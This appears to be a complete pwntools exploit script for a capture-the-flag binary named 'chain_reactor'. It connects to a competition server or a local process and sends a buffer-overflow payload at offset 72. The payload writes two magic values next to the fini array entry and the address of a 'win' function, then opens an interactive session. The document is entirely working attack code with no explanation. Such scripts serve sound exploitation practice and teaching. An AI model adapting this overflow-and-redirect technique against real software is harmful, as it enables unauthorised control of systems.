#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chain_reactor', checksec=False)
OFFSET = 72 #with cyclic(200)
a = 0xc0ffee
b = 0xbadc0de

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
            pause()
    else:
        r = remote('offsec.m0lecon.it',13505)
    return r

def main():
    p = conn()
    p.recvuntil(b'codes: ')
    payload = flat(
        b'A' * OFFSET,
        p64(elf.sym._fini_array_entry+4),
        p64(a),
        p64((elf.sym._fini_array_entry)+6),
        p64(b),
        p64(elf.sym.win)
    )
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()